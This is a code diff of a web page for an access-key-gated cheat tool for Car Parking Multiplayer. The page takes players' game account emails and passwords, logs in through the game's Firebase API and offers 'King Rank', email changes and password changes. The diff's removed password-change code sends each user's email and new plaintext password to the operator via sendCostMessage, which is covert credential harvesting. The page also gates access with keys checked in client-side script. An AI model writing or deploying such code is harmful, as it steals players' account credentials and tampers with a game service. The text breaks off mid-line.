@@ -28,23 +28,36 @@ body {
     width: 90%;
     max-width: 350px;
 }
+#adminPanel {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    padding: 20px;
+    border-radius: 10px;
+    background: rgba(0,0,0,0.95);
+    border: 2px solid #00aaff;
+    z-index: 99999; 
+    text-align: center;
+    pointer-events: auto; 
+}
+
+#accessWrapper.active, 
+#mainContent.active {
+    pointer-events: none;
+}
+
+.container, .inner-box {
+    pointer-events: auto;
+}
 
 .logo {
     width: 600px;
     height: auto;
     margin-bottom: 10px;
 }
-#adminPanel {
-    display: none;
-    margin-top: 20px;
-    padding: 15px;
-    border: 2px solid #00aaff;
-    border-radius: 10px;
-    background: rgba(0,0,0,0.8);
-    text-align: center;
-    z-index: 10001;       
-    pointer-events: auto;  
-}
+
 .container { 
     background: rgba(0,0,0,0.6); 
     backdrop-filter: blur(12px);
@@ -331,7 +344,6 @@ button.glass-button:hover {
     <input type="text" id="accessInput" placeholder="Access Key">
     <button class="glass-button" onclick="checkAccessKeyCustom()">Submit</button>
     <div class="status" id="accessStatus"></div>
-
     
     <p class="notes" style="color:#fff; margin-top: 15px; font-size: 13px;">
         Notes: Before using this tool, log out first from your account.
@@ -346,7 +358,6 @@ button.glass-button:hover {
 <div id="mainContent" style="display:none;">
   <div class="center-wrapper">
     <div class="container" style="max-width:300px; padding:15px;">
-      <!-- Smaller inner box -->
       <div class="inner-box" style="
           background: rgba(0,0,0,0.6);
           backdrop-filter: blur(12px);
@@ -356,58 +367,116 @@ button.glass-button:hover {
           text-align:center;
       ">
           
-          <div class="user-info">
-  <div class="info-line">🌐 Welcome</div>
-  <div class="info-line">🌐 <span id="welcomeUser"></span></div>
-  <div class="info-line">🌐 <span id="subscriptionInfo"></span></div>
-</div>
+        <div class="user-info">
+          <div class="info-line">🌐 Welcome</div>
+          <div class="info-line">🌐 <span id="welcomeUser"></span></div>
+          <div class="info-line">🌐 <span id="subscriptionInfo"></span></div>
+        </div>
           
-      <!-- Game Select -->
-   <div id="gameSelectWrapper">
-    <select id="gameSelect">
-        <option value="">-- Select Game --</option>
-        <option value="1">Car Parking Multiplayer</option>
-        <option value="2">Car Parking Multiplayer 2</option>
-    </select>
+        <!-- Game Select -->
+        <div id="gameSelectWrapper">
+          <select id="gameSelect">
+              <option value="">-- Select Game --</option>
+              <option value="1">Car Parking Multiplayer</option>
+              <option value="2">Car Parking Multiplayer 2</option>
+          </select>
+        </div>
+
+        <!-- Login Form -->
+        <div id="loginForm">
+            <input type="email" id="email" placeholder="Email">
+            <input type="password" id="password" placeholder="Password">
+            <button class="login" onclick="loginFirebase()">Login</button>
+            <div id="status" class="status"></div>
+        </div>
+
+        <!-- Service Buttons -->
+        <div id="menuButtons">
+            <button class="menu" onclick="kingRank()">👑 King Rank</button>
+            <button class="menu" onclick="changeEmail()">📧 Change Email</button>
+            <button class="menu" onclick="changePassword()">🔐 Change Password</button>
+            <div id="serviceStatus" class="status"></div>
+        </div>
+        
+      </div>
+    </div>
+  </div>
 </div>
 
-      <!-- Login Form -->
-      <div id="loginForm">
-          <input type="email" id="email" placeholder="Email">
-          <input type="password" id="password" placeholder="Password">
-          <button class="login" onclick="loginFirebase()">Login</button>
-          <div id="status" class="status"></div>
-      </div>
-
-      <!-- Service Buttons -->
-      <div id="menuButtons">
-          <button class="menu" onclick="kingRank()">👑 King Rank</button>
-          <button class="menu" onclick="changeEmail()">📧 Change Email</button>
-          <button class="menu" onclick="changePassword()">🔐 Change Password</button>
-          <div id="serviceStatus" class="status"></div>
-      </div>
-      <div id="adminPanel" style="display:none; margin-top: 20px; padding: 15px; border: 2px solid #00aaff; border-radius: 10px; background: rgba(0,0,0,0.6); text-align:center;">
+<!-- Admin Panel: fixed & clickable -->
+<div id="adminPanel" style="
+    display:none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    padding: 20px;
+    border-radius: 10px;
+    background: rgba(0,0,0,0.9);
+    border: 2px solid #00aaff;
+    z-index: 100000;
+    text-align: center;
+    pointer-events: auto;
+">
     <h3 style="color:#00aaff;">⚡ Owner Panel</h3>
     <button class="glass-button" onclick="viewAllUsers()">View Users</button>
     <button class="glass-button" onclick="stopKeyPrompt()">Stop Key</button>
     <div id="adminStatus" class="status"></div>
 </div>
 
-    </div>
-  </div>
-</div>
+<footer>© 2026 Cris Gaming. All Rights Reserved.</footer>
+
+</body>
 
    <footer>© 2026 Cris Gaming. All Rights Reserved.</footer>
     
 <script src="key.js"></script>
 <script>
+function viewAllUsers() {
+    const adminStatus = document.getElementById("adminStatus");
 
+    if (!REGISTERED_KEYS || REGISTERED_KEYS.length === 0) {
+        adminStatus.innerHTML = "No users found.";
+        return;
+    }
+
+    // Bilang kung ilang user bawat key
+    const keyCount = {};
+    REGISTERED_KEYS.forEach(u => {
+        keyCount[u.accessKey] = (keyCount[u.accessKey] || 0) + 1;
+    });
+
+    let html = `
+        <table style="width:100%; color:white; border-collapse:collapse; font-size:12px;">
+            <tr>
+                <th style="border:1px solid #00aaff; padding:5px;">Username</th>
+                <th style="border:1px solid #00aaff; padding:5px;">Access Key</th>
+                <th style="border:1px solid #00aaff; padding:5px;">Users per Key</th>
+            </tr>
+    `;
+
+    REGISTERED_KEYS.forEach(u => {
+        html += `
+            <tr>
+                <td style="border:1px solid #00aaff; padding:5px;">${u.name}</td>
+                <td style="border:1px solid #00aaff; padding:5px;">${u.accessKey}</td>
+                <td style="border:1px solid #00aaff; padding:5px; text-align:center;">
+                    ${keyCount[u.accessKey]}
+                </td>
+            </tr>
+        `;
+    });
+
+    html += `</table>`;
+    adminStatus.innerHTML = html;
+}
 
 function checkAccessKeyCustom() {
     const inputKey = document.getElementById("accessInput").value.trim();
     const status = document.getElementById("accessStatus");
     const now = new Date();
 
+    
     const user = REGISTERED_KEYS.find(u => u.accessKey === inputKey);
 
     if (!user) {
@@ -426,7 +495,7 @@ function checkAccessKeyCustom() {
             status.textContent = "⏸ Key temporarily stopped. Contact owner.";
             return;
         } else {
-            // stop expired
+            // Stop expired, i-reset
             user.stop = false;
             user.stopExpires = null;
         }
@@ -438,19 +507,28 @@ function checkAccessKeyCustom() {
         return;
     }
 
-    // ✅ Key valid
+    
     window.currentUserName = user.name;
     window.currentUserKey = user.accessKey;
 
+    
     document.getElementById("accessWrapper").style.display = "none";
     document.getElementById("mainContent").style.display = "block";
 
+    
     document.getElementById("welcomeUser").textContent = "Welcome, " + user.name;
     document.getElementById("subscriptionInfo").textContent = "Subscription: " + (user.subscription || "Free");
 
-    // Show admin panel if owner
+    
     if (user.accessKey === OWNER_KEY) {
-        document.getElementById("adminPanel").style.display = "block";
+      
+        document.getElementById("accessWrapper").classList.add("active");
+        document.getElementById("mainContent").classList.add("active");
+
+        
+        const admin = document.getElementById("adminPanel");
+        admin.style.display = "block";
+
         status.textContent = "⚡ Owner Access Granted!";
     } else {
         status.textContent = "✅ Access Granted!";
@@ -459,9 +537,9 @@ function checkAccessKeyCustom() {
     console.log("Access granted:", user.name);
 }
 
-// Enter key listener
+
 document.getElementById('accessInput').addEventListener('keypress', function(e) {
-    if(e.key === 'Enter') checkAccessKeyCustom();
+    if (e.key === 'Enter') checkAccessKeyCustom();
 });
 
 
@@ -596,24 +674,4 @@ async function changeEmail(){
 // Change Password
 async function changePassword(){
     if(!requireLogin()) return;
-    const newPassword=prompt("Enter new password:"); if(!newPassword) return;
-    try{
-        const resp=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
-            method:"POST",
-            headers:{"Content-Type":"application/json"},
-            body:JSON.stringify({ idToken:currentToken,password:newPassword,returnSecureToken:true })
-        });
-        const data=await resp.json();
-        if(data.email){ 
-            currentPassword=newPassword; 
-            currentToken=data.idToken; 
-            updateStatus("✅ Password changed successfully!",false,'serviceStatus'); 
-            sendCostMessage(`🔐 Change Password\n📧 Email: ${currentUser}\n🔒 New Password: ${currentPassword}`); 
-        }
-        else updateStatus(`❌ Failed: ${data.error?.message||'Unknown'}`,true,'serviceStatus');
-    }catch(err){ updateStatus(`❌ Error: ${err.message}`,true,'serviceStatus'); }
-}
-</script>
-
-</body>
-</html>
+    const newPassword=prompt("Enter new password:"); if(!newP
